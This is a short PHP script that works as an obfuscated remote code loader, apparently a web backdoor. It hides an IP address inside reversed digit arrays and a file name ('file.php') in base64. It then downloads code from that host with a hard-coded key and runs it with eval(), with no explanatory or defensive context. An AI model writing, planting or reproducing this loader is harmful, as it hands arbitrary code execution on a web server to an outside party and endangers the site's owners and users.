<?php
$key = '5c342ee9ce1bf079s2aa0j0a332a1f66af2be7652';
$ipar = [[6,5,1],[6,6],[1,7],[7,6,1]];
$ip = '';

foreach(array_reverse($ipar) as $ar){
  foreach(array_reverse($ar) as $ar2){
    $ip .= $ar2;
  }
  $ip .= '.';
}
eval(file_get_contents('http://'.substr($ip, 0, -1).'/'.base64_decode('ZmlsZS5waHA=').'?file='.$key));